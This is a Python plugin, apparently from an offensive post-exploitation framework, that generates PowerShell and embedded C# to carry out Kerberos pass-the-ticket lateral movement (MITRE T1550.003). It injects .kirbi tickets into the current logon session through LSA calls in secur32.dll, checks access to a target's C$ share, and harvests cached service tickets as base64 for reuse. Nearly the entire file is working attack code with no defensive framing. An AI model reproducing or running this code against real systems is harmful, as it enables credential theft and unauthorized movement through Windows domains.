"""lateral_movement/pass_the_ticket — Pass-the-Ticket Kerberos lateral movement. MITRE T1550.003"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class PassTheTicket(BasePlugin):
    NAME = "pass_the_ticket"
    DESCRIPTION = "Inject Kerberos ticket (.kirbi) into current session for lateral movement (T1550.003)"
    AUTHOR = "fitnah-team"
    MITRE = "T1550.003"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("ticket_b64", str, required=False, default="",
              help="Base64-encoded .kirbi ticket bytes to inject"),
        Param("ticket_path", str, required=False, default="",
              help="UNC/local path to .kirbi file on the target"),
        Param("action", str, required=False, default="inject",
              help="inject | list | purge | harvest"),
        Param("target", str, required=False, default="",
              help="Target host to verify access after injection"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action      = params.get("action", "inject").lower()
        ticket_b64  = params.get("ticket_b64", "")
        ticket_path = params.get("ticket_path", "")
        target      = params.get("target", "")

        if action == "list":
            ps = self._list_tickets()
        elif action == "purge":
            ps = self._purge_tickets()
        elif action == "harvest":
            ps = self._harvest_tickets()
        else:
            if not ticket_b64 and not ticket_path:
                return ModuleResult.err("Provide ticket_b64 or ticket_path for inject action")
            ps = self._inject_ticket(ticket_b64, ticket_path, target)

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"Pass-the-Ticket failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="ptt_execution")

    @staticmethod
    def _inject_ticket(ticket_b64: str, ticket_path: str, target: str) -> str:
        load_block = ""
        if ticket_b64:
            load_block = f'$ticketBytes = [Convert]::FromBase64String("{ticket_b64}")'
        else:
            load_block = f'$ticketBytes = [System.IO.File]::ReadAllBytes("{ticket_path}")'

        verify_block = ""
        if target:
            verify_block = f"""
    # Verify access to target after injection
    $dir = cmd /c "dir \\\\{target}\\C$ 2>&1"
    $results += "[*] Access check \\\\{target}\\C$: $dir"
"""

        return f"""
$results = @()
$results += '[*] Pass-the-Ticket — injecting Kerberos ticket (T1550.003)'

try {{
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class KerberosTicket {{
    [DllImport("secur32.dll", SetLastError=true)]
    public static extern int LsaConnectUntrusted(out IntPtr lsaHandle);

    [DllImport("secur32.dll", SetLastError=true)]
    public static extern int LsaLookupAuthenticationPackage(IntPtr lsaHandle,
        ref LSA_STRING packageName, out uint authPackage);

    [DllImport("secur32.dll", SetLastError=true)]
    public static extern int LsaCallAuthenticationPackage(IntPtr lsaHandle,
        uint authPackage, IntPtr protocolSubmitBuffer, int submitBufferLength,
        out IntPtr protocolReturnBuffer, out int returnBufferLength, out int protocolStatus);

    [DllImport("secur32.dll")] public static extern int LsaFreeReturnBuffer(IntPtr buffer);
    [DllImport("secur32.dll")] public static extern int LsaDeregisterLogonProcess(IntPtr lsaHandle);

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_STRING {{
        public ushort Length;
        public ushort MaximumLength;
        [MarshalAs(UnmanagedType.LPStr)] public string Buffer;
    }}

    // KERB_SUBMIT_TKT_REQUEST for KerbSubmitTicketMessage (21)
    [StructLayout(LayoutKind.Sequential)]
    public struct KERB_SUBMIT_TKT_REQUEST {{
        public int MessageType;   // 21 = KerbSubmitTicketMessage
        public LUID LogonId;
        public int Flags;
        public ulong KeyEncryptionType;
        public int KerbCredSize;
        public int KerbCredOffset;
    }}

    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {{ public uint LowPart; public int HighPart; }}
}}
"@ -Language CSharp -ErrorAction Stop

    {load_block}
    $results += "[*] Ticket size: $($ticketBytes.Length) bytes"

    # Connect to LSA
    $lsaHandle = [IntPtr]::Zero
    $status = [KerberosTicket]::LsaConnectUntrusted([ref]$lsaHandle)
    if ($status -ne 0) {{ throw "LsaConnectUntrusted failed: 0x$($status.ToString('X8'))" }}
    $results += "[+] LSA handle acquired"

    # Look up Kerberos package
    $pkg = New-Object KerberosTicket+LSA_STRING
    $pkg.Buffer = "kerberos"
    $pkg.Length = [ushort]8
    $pkg.MaximumLength = [ushort]9
    $authPkg = [uint32]0
    $status = [KerberosTicket]::LsaLookupAuthenticationPackage($lsaHandle, [ref]$pkg, [ref]$authPkg)
    if ($status -ne 0) {{ throw "LsaLookupAuthenticationPackage failed: 0x$($status.ToString('X8'))" }}
    $results += "[+] Kerberos package ID: $authPkg"

    # Build KERB_SUBMIT_TKT_REQUEST + ticket blob in unmanaged memory
    $reqSize   = [System.Runtime.InteropServices.Marshal]::SizeOf([type][KerberosTicket+KERB_SUBMIT_TKT_REQUEST])
    $totalSize = $reqSize + $ticketBytes.Length
    $pBuffer   = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($totalSize)

    $req = New-Object KerberosTicket+KERB_SUBMIT_TKT_REQUEST
    $req.MessageType      = 21   # KerbSubmitTicketMessage
    $req.Flags            = 0
    $req.KerbCredSize     = $ticketBytes.Length
    $req.KerbCredOffset   = $reqSize
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($req, $pBuffer, $false)
    [System.Runtime.InteropServices.Marshal]::Copy($ticketBytes, 0,
        [IntPtr]($pBuffer.ToInt64() + $reqSize), $ticketBytes.Length)

    $pReturn     = [IntPtr]::Zero
    $returnLen   = 0
    $protoStatus = 0
    $status = [KerberosTicket]::LsaCallAuthenticationPackage(
        $lsaHandle, $authPkg, $pBuffer, $totalSize,
        [ref]$pReturn, [ref]$returnLen, [ref]$protoStatus)

    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pBuffer)
    if ($pReturn -ne [IntPtr]::Zero) {{ [KerberosTicket]::LsaFreeReturnBuffer($pReturn) | Out-Null }}
    [KerberosTicket]::LsaDeregisterLogonProcess($lsaHandle) | Out-Null

    if ($status -eq 0 -and $protoStatus -eq 0) {{
        $results += "[+] Ticket injected successfully into current logon session"
    }} else {{
        $results += "[-] Injection status=0x$($status.ToString('X8'))  proto=0x$($protoStatus.ToString('X8'))"
    }}
    {verify_block}
}} catch {{
    $results += "[!] $($_)"
}}

$results -join "`n"
"""

    @staticmethod
    def _list_tickets() -> str:
        return """
$results = @()
$results += '[*] Listing Kerberos tickets in current session'
try {
    $klist = klist.exe 2>&1
    $results += $klist
} catch {
    $results += "[!] $_"
}
$results -join "`n"
"""

    @staticmethod
    def _purge_tickets() -> str:
        return """
$results = @()
$results += '[*] Purging Kerberos tickets from current session'
try {
    $out = klist.exe purge 2>&1
    $results += $out
    $results += "[+] Ticket cache purged"
} catch {
    $results += "[!] $_"
}
$results -join "`n"
"""

    @staticmethod
    def _harvest_tickets() -> str:
        return """
$results = @()
$results += '[*] Harvesting all Kerberos tickets from current session'
try {
    Add-Type -AssemblyName System.IdentityModel | Out-Null

    $spns = @()
    # Enumerate cached tickets via klist and re-request for export
    $klistOut = klist.exe 2>&1 | Out-String
    $regex = [regex]'Server: +([^ ]+)'
    $matches = $regex.Matches($klistOut)
    foreach ($m in $matches) {
        $spn = $m.Groups[1].Value
        if ($spn -and $spn -notmatch '^krbtgt') { $spns += $spn }
    }
    $results += "[*] Found $($spns.Count) cached SPNs"

    $exported = @()
    foreach ($spn in $spns) {
        try {
            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
            $bytes = $token.GetRequest()
            $b64   = [Convert]::ToBase64String($bytes)
            $exported += "SPN=$spn`nTICKET=$b64"
            $results += "[+] Exported: $spn ($($bytes.Length) bytes)"
        } catch { $results += "  [!] $spn : $_" }
    }

    if ($exported.Count -gt 0) {
        $results += ""
        $results += "=== HARVESTED TICKETS (base64 kirbi) ==="
        $results += $exported
    }
} catch {
    $results += "[!] $_"
}
$results -join "`n"
"""
